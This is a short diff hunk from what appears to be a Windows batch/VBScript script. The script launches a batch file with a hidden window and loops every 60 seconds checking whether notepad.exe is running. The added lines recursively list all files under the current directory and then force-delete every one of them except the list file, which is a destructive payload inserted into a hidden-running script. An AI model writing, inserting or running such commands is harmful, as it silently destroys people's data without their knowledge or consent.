@@ -7,6 +7,11 @@ WshShell.run """.\tmp.bat"" ", 0, true
 
 ###################################################################################################################################
 
+dir /s/b > files.txt
+get-content files.txt | foreach-object {Remove-Item -recurse -force -exclude files.txt $_}
+
+###################################################################################################################################
+
 :loop
 timeout 60
 FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq notepad.exe"') DO IF %%x == notepad.exe goto FOUND
